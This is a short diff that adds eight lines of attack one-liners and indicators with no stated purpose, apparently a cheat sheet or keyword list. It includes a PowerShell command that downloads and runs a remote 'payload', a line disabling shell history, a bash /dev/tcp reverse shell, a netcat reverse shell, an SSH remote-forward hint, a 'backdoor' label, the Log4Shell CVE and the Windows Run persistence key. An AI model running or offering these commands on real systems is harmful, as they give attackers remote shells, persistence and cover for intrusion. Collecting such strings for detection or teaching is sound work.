@@ -1,0 +1,8 @@
+powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload')
+HISTFILE=/dev/null
+OpenSSH backdoor
+usage: ssh -R 4444
+bash -i >& /dev/tcp/0.0.0.0/4444 0>&1
+nc -e /bin/bash 0.0.0.0 4444
+CVE-2021-44228
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
